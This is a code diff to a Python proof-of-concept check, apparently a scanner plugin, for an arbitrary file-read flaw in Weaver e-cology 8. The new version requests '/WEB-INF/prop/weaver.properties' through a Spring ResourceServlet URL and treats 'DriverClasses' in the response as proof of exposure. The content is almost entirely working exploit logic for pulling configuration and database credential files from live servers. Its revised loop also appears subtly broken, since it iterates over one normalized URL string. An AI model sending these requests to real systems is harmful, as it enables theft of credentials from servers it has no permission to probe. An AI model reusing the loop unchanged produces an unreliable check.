@@ -13,7 +13,7 @@ class POC(Script):
         self.service_type = SERVICE_PORT_MAP.WEB
         self.name = 'ecology8 download'
         self.keyword = ['ecology8', 'download']
-        self.info = 'ecology8 download'
+        self.info = 'ecology8 download2'
         self.type = VUL_TYPE.INFO
         self.level = VUL_LEVEL.HIGH
         Script.__init__(self, target=target, service_type=self.service_type)
@@ -21,21 +21,15 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
-                    # url = path + "weaver/ln.FileDownload?fpath=../weaver/WEB-INF/prop/weaver.properties"
-                    url = path + "weaver/ln.FileDownload?fpath=conf/resin.conf"
+                for path in self.url_normpath(self.url, './'):
+                    url = path + "weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties"
 
                     async with session.get(url=url) as res:
                         if res != None:
                             text = await res.text()
-                            # if res != None and 'DriverClasses' in res.text:
-                            if 'xmlns:resin' in text:
+                            if 'DriverClasses' in text:
                                 self.flag = 1
                                 self.req.append({"url": url})
-                                self.res.append({"info": url, "key": "ecology8 download"})
+                                self.res.append({"info": url, "key": "ecology8 download2"})
                                 return
